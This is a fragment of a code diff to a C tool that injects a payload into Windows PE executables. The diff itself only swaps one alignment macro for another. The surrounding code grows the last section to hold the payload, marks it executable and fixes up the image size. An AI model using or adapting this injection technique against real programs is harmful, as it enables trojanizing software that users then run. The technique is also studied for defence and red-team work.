@@ -70,17 +70,15 @@ BOOL InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPaylo
         }
     }
 
-#pragma warning(suppress : 4146)
-    dwSizeAligned = PG_ALIGN_UP(dwPayloadSize, dwFileAlignment);
+    dwSizeAligned = ALIGN(dwPayloadSize, dwFileAlignment);
     printf("Aligned payload size: %#lx (%lu)\n", dwSizeAligned, dwSizeAligned);
     pLastSection->Misc.VirtualSize = pLastSection->SizeOfRawData + dwPayloadSize;
     pLastSection->SizeOfRawData += dwSizeAligned;
     pNtHeader->OptionalHeader.SizeOfCode += pLastSection->Characteristics & IMAGE_SCN_CNT_CODE
                                                 ? dwSizeAligned
                                                 : pLastSection->SizeOfRawData;
-#pragma warning(suppress : 4146)
-    pNtHeader->OptionalHeader.SizeOfImage = PG_ALIGN_UP(
-        pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize, dwSectionAlignment);
+    pNtHeader->OptionalHeader.SizeOfImage =
+        ALIGN(pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize, dwSectionAlignment);
     pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
     pLastSection->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
     printf("New raw size:      %#lx (%lu)\n", pLastSection->SizeOfRawData,
@@ -140,8 +138,7 @@ int main(int argc, char* argv[]) {
 
     dwFileSize = GetFileSize(hFile, NULL);
     printf("File size: %lu bytes\n", dwFileSize);
-#pragma warning(suppress : 4146)
-    DWQUAD(uliSize) = PG_ALIGN_UP(dwFileSize + PG_ALIGN_UP(dwPayloadSize, 512), 512);
+    DWQUAD(uliSize) = ALIGN(dwFileSize + ALIGN(dwPayloadSize, 512), 512);
 
     hMapFile = CreateFileMapping(hFile, NULL, PAGE_READWRITE, DWHILO(uliSize), NULL);
     if (hMapFile == NULL) {
